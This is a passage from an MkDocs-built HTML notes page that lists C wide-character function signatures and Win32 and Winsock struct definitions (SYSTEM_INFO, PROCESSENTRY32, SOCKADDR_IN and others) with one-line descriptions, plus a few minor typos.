<pre><code class="language-c">wchar_t *wcsstr(
    const wchar_t *str1, 
    const wchar_t *str2
); // Finds the first occurrence of the wide string str2 in the wide string str1.
</code></pre>
<p>[wcstok]</p>
<pre><code class="language-c">wchar_t *wcstok(
    wchar_t *str, 
    const wchar_t *delimiters
); // Splits the wide string str into tokens based on the delimiters.
</code></pre>
<h3 id="character-classification-and-conversion">Character Classification and Conversion</h3>
<p>[towupper]</p>
<pre><code class="language-c">wint_t towupper(
    wint_t c
); // Converts a wide character to uppercase.
</code></pre>
<p>[towlower]</p>
<pre><code class="language-c">wint_t towlower(
    wint_t c
); // Converts a wide character to lowercase.
</code></pre>
<p>[iswalpha]</p>
<pre><code class="language-c">int iswalpha(
    wint_t c
); // Checks if the wide character is an alphabetic character.
</code></pre>
<p>[iswdigit]</p>
<pre><code class="language-c">int iswdigit(
    wint_t c
); // Checks if the wide character is a decimal digit.
</code></pre>
<p>[iswalnum]</p>
<pre><code class="language-c">int iswalnum(
    wint_t c
); // Checks if the wide character is an alphanumeric character.
</code></pre>
<p>[iswspace]</p>
<pre><code class="language-c">int iswspace(
    wint_t c
); // Checks if the wide character is a whitespace character.
</code></pre>
<p>[iswxdigit]</p>
<pre><code class="language-c">int iswxdigit(
    wint_t c
); // Checks if the wide character is a valid hexadecimal digit.
</code></pre>
<hr />
<h2 id="win32-structs-cheat-sheet">Win32 Structs Cheat Sheet</h2>
<h3 id="common-structs">Common Structs</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-system_info"><strong><code>SYSTEM_INFO</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;sysinfoapi.h&gt;
// Contains information about the current computer system, including the architecture and type of the processor, the number of processors, and the page size.
typedef struct _SYSTEM_INFO {
    union {
        DWORD dwOemId;
        struct {
            WORD wProcessorArchitecture;
            WORD wReserved;
        } DUMMYSTRUCTNAME;
    } DUMMYUNIONNAME;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
} SYSTEM_INFO;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-filetime"><strong><code>FILETIME</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;minwinbase.h&gt;
// Represents the number of 100-nanosecond intervals since January 1, 1601 (UTC). Used for file and system time.
typedef struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
} FILETIME;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa"><strong><code>STARTUPINFO</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;processthreadsapi.h&gt;
// Specifies the window station, desktop, standard handles, and appearance of the main window for a process at creation time.
typedef struct _STARTUPINFOA {
    DWORD  cb;
    LPSTR  lpReserved;
    LPSTR  lpDesktop;
    LPSTR  lpTitle;
    DWORD  dwX;
    DWORD  dwY;
    DWORD  dwXSize;
    DWORD  dwYSize;
    DWORD  dwXCountChars;
    DWORD  dwYCountChars;
    DWORD  dwFillAttribute;
    DWORD  dwFlags;
    WORD   wShowWindow;
    WORD   cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
} STARTUPINFOA, *LPSTARTUPINFOA;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-process_information"><strong><code>PROCESS_INFORMATION</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;processthreadsapi.h&gt;
// Contains information about a newly created process and its primary thread.
typedef struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD  dwProcessId;
    DWORD  dwThreadId;
} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/ns-tlhelp32-processentry32"><strong><code>PROCESSENTRY32</code></strong></a></p>
<pre><code class="language-c">#include &lt;tlhelp32.h&gt;
typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;
  DWORD     cntUsage;
  DWORD     th32ProcessID;
  ULONG_PTR th32DefaultHeapID;
  DWORD     th32ModuleID;
  DWORD     cntThreads;
  DWORD     th32ParentProcessID;
  LONG      pcPriClassBase;
  DWORD     dwFlags;
  CHAR      szExeFile[MAX_PATH];
} PROCESSENTRY32;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa379560(v=vs.85)"><strong><code>SECURITY_ATTRIBUTES</code></strong></a></p>
<pre><code class="language-cpp">// Determines whether the handle can be inherited by child processes and specifies a security descriptor for a new object.
typedef struct _SECURITY_ATTRIBUTES {
    DWORD  nLength;
    LPVOID lpSecurityDescriptor;
    BOOL   bInheritHandle;
} SECURITY_ATTRIBUTES, *LPSECURITY_ATTRIBUTES;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-overlapped"><strong><code>OVERLAPPED</code></strong></a></p>
<pre><code class="language-cpp">#inluce &lt;minwinbase.h&gt;
// Contains information used in asynchronous (also known as overlapped) input and output (I/O) operations.
typedef struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union {
        struct {
            DWORD Offset;
            DWORD OffsetHigh;
        } DUMMYSTRUCTNAME;
        PVOID Pointer;
    } DUMMYUNIONNAME;
    HANDLE hEvent;
} OVERLAPPED, *LPOVERLAPPED;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid"><strong><code>GUID</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;guiddef.h&gt;
// Represents a globally unique identifier (GUID), used to identify objects, interfaces, and other items.
typedef struct _GUID {
    unsigned long  Data1;
    unsigned short Data2;
    unsigned short Data3;
    unsigned char  Data4[8];
} GUID;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information"><strong><code>MEMORY_BASIC_INFORMATION</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;winnt.h&gt;
// Contains information about a range of pages in the virtual address space of a process.
typedef struct _MEMORY_BASIC_INFORMATION {
    PVOID  BaseAddress;
    PVOID  AllocationBase;
    DWORD  AllocationProtect;
    SIZE_T RegionSize;
    DWORD  State;
    DWORD  Protect;
    DWORD  Type;
} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/minwinbase/ns-minwinbase-systemtime"><strong><code>SYSTEMTIME</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;minwinbase.h&gt;
// Specifies a date and time, using individual members for the month, day, year, weekday, hour, minute, second, and millisecond.
typedef struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
} SYSTEMTIME, *PSYSTEMTIME, *LPSYSTEMTIME;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/console/coord-str"><strong><code>COORD</code></strong></a></p>
<pre><code class="language-cpp">// Defines the coordinates of a character cell in a console screen buffer, where the origin (0,0) is at the top-left corner.
typedef struct _COORD {
    SHORT X;
    SHORT Y;
} COORD, *PCOORD;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/console/small-rect-str"><strong><code>SMALL_RECT</code></strong></a></p>
<pre><code class="language-cpp">//  Defines the coordinates of the upper left and lower right corners of a rectangle.
typedef struct _SMALL_RECT {
    SHORT Left;
    SHORT Top;
    SHORT Right;
    SHORT Bottom;
} SMALL_RECT;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/console/console-screen-buffer-info-str"><strong><code>CONSOLE_SCREEN_BUFFER_INFO</code></strong></a></p>
<pre><code class="language-cpp">// Contains information about a console screen buffer.
typedef struct _CONSOLE_SCREEN_BUFFER_INFO {
    COORD      dwSize;
    COORD      dwCursorPosition;
    WORD       wAttributes;
    SMALL_RECT srWindow;
    COORD      dwMaximumWindowSize;
} CONSOLE_SCREEN_BUFFER_INFO, *PCONSOLE_SCREEN_BUFFER_INFO;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata"><strong><code>WSADATA</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;winsock.h&gt;
// Contains information about the Windows Sockets implementation.
typedef struct WSAData {
    WORD           wVersion;
    WORD           wHighVersion;
    unsigned short iMaxSockets;
    unsigned short iMaxUdpDg;
    char FAR       *lpVendorInfo;
    char           szDescription[WSADESCRIPTION_LEN+1];
    char           szSystemStatus[WSASYS_STATUS_LEN+1];
} WSADATA, *LPWSADATA;
</code></pre>
<p><a href="[struct RTL_CRITICAL_SECTION (nirsoft.net)](https://www.nirsoft.net/kernel_struct/vista/RTL_CRITICAL_SECTION.html)"><strong><code>CRITICAL_SECTION</code></strong></a></p>
<pre><code class="language-c++">// Represents a critical section object, which is used to provide synchronization access to a shared resource.
typedef struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
} RTL_CRITICAL_SECTION, *PRTL_CRITICAL_SECTION;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-wsaprotocol_infoa"><strong><code>WSAPROTOCOL_INFO</code></strong></a></p>
<pre><code class="language-c++">#include &lt;winsock2.h&gt;
// Contains Windows Sockets protocol information.
typedef struct _WSAPROTOCOL_INFOA {
    DWORD          dwServiceFlags1;
    DWORD          dwServiceFlags2;
    DWORD          dwServiceFlags3;
    DWORD          dwServiceFlags4;
    DWORD          dwProviderFlags;
    GUID           ProviderId;
    DWORD          dwCatalogEntryId;
    WSAPROTOCOLCHAIN ProtocolChain;
    int            iVersion;
    int            iAddressFamily;
    int            iMaxSockAddr;
    int            iMinSockAddr;
    int            iSocketType;
    int            iProtocol;
    int            iProtocolMaxOffset;
    int            iNetworkByteOrder;
    int            iSecurityScheme;
    DWORD          dwMessageSize;
    DWORD          dwProviderReserved;
    CHAR           szProtocol[WSAPROTOCOL_LEN+1];
} WSAPROTOCOL_INFOA, *LPWSAPROTOCOL_INFOA;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/ns-ws2tcpip-_msghdr"><strong><code>MSGHDR</code></strong></a></p>
<pre><code class="language-c++">#include &lt;ws2def.h&gt;
// Contains message information for use with the `sendmsg` and `recvmsg` functions.
typedef struct _WSAMSG {
    LPSOCKADDR       name;
    INT              namelen;
    LPWSABUF         lpBuffers;
    ULONG            dwBufferCount;
    WSABUF           Control;
    ULONG            dwFlags;
} WSAMSG, *PWSAMSG, *LPWSAMSG;
</code></pre>
<h3 id="win32-sockets-structs-cheat-sheet-winsockh">Win32 Sockets Structs Cheat Sheet (winsock.h)</h3>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr"><strong><code>SOCKADDR</code></strong></a></p>
<pre><code class="language-cpp">// A generic socket address structure used for compatibility with various address families.
typedef struct sockaddr {
    u_short sa_family;
    char    sa_data[14];
} SOCKADDR, *PSOCKADDR, *LPSOCKADDR;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in"><strong><code>SOCKADDR_IN</code></strong></a></p>
<pre><code class="language-cpp">// Represents an IPv4 socket address, containing the IPv4 address, port number, and address family.
typedef struct sockaddr_in {
    short          sin_family;
    u_short        sin_port;
    struct in_addr sin_addr;
    char           sin_zero[8];
} SOCKADDR_IN, *PSOCKADDR_IN, *LPSOCKADDR_IN;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-linger"><strong><code>LINGER</code></strong></a></p>
<pre><code class="language-cpp">// Used to set the socket option SO_LINGER, which determines the action taken when unsent data is queued on a socket and a `closesocket` is performed.
typedef struct linger {
    u_short l_onoff;
    u_short l_linger;
} LINGER, *PLINGER, *LPLINGER;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-timeval"><strong><code>TIMEVAL</code></strong></a></p>
<pre><code class="language-cpp">// Represents a time interval, used with the `select` function to specify a timeout period.
typedef struct timeval {
    long tv_sec;
    long tv_usec;
} TIMEVAL, *PTIMEVAL, *LPTIMEVAL;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-fd_set"><strong><code>FD_SET</code></strong></a></p>
<pre><code class="language-cpp">// Represents a set of sockets used with the `select` function to check for socket events.
typedef struct fd_set {
    u_int fd_count;
    SOCKET fd_array[FD_SETSIZE];
} fd_set, *Pfd_set, *LPfd_set;
</code></pre>
<h3 id="win32-sockets-structs-cheat-sheet-winsock2h">Win32 Sockets Structs Cheat Sheet (winsock2.h)</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr"><strong><code>IN_ADDR</code></strong></a></p>
<pre><code class="language-cpp">// Represents an IPv4 address.
typedef struct in_addr {
    union {
        struct {
            u_char s_b1, s_b2, s_b3, s_b4;
        } S_un_b;
        struct {
            u_short s_w1, s_w2;
        } S_un_w;
        u_long S_addr;
    } S_un;
} IN_ADDR, *PIN_ADDR, *LPIN_ADDR;
</code></pre>
<h3 id="win32-sockets-structs-cheat-sheet-ws2defh">Win32 Sockets Structs Cheat Sheet (ws2def.h)</h3>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-addrinfow"><strong><code>ADDRINFO</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;ws2def.h&gt;
// Contains information about an address for use with the `getaddrinfo` function, and is used to build a linked list of addresses.
typedef struct addrinfoW {
    int             ai_flags;
    int             ai_family;
    int             ai_socktype;
    int             ai_protocol;
    size_t          ai_addrlen;
    PWSTR           *ai_canonname;
    struct sockaddr *ai_addr;
    struct addrinfo *ai_next;
} ADDRINFOW, *PADDRINFOW;
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-wsabuf"><strong><code>WSABUF</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;ws2def.h&gt;
// Contains a pointer to a buffer and its length. Used for scatter/gather I/O operations.
typedef struct _WSABUF {
    ULONG len;
    __field_bcount(len) CHAR FAR *buf;
} WSABUF, FAR * LPWSABUF;
</code></pre>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/api/ws2ipdef/ns-ws2ipdef-sockaddr_in6"><strong><code>SOCKADDR_IN6</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;ws2ipdef.h&gt;
// Represents an IPv6 socket address, containing the IPv6 address, port number, flow info, and address family.
typedef struct sockaddr_in6 {
    short          sin6_family;
    u_short        sin6_port;
    u_long         sin6_flowinfo;
    struct in6_addr sin6_addr;
    u_long         sin6_scope_id;
} SOCKADDR_IN6, *PSOCKADDR_IN6, *LPSOCKADDR_IN6;
</code></pre>
<p><a href="https://learn.microsoft.com/en-us/windows/win32/api/in6addr/ns-in6addr-in6_addr"><strong><code>IN6_ADDR</code></strong></a></p>
<pre><code class="language-cpp">#include &lt;in6addr.h&gt;
// Represents an IPv6 address.
typedef struct in6_addr {
    union {
        u_char Byte[16];
        u_short Word[8];
    } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;
</code></pre>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../crackmes.one%E7%BB%83%E4%B9%A0/" class="btn btn-xs btn-link">
        Crackmes.oneÁªÉ‰π†
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
        LinuxÂÆâÂÖ®Á¨îËÆ∞
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>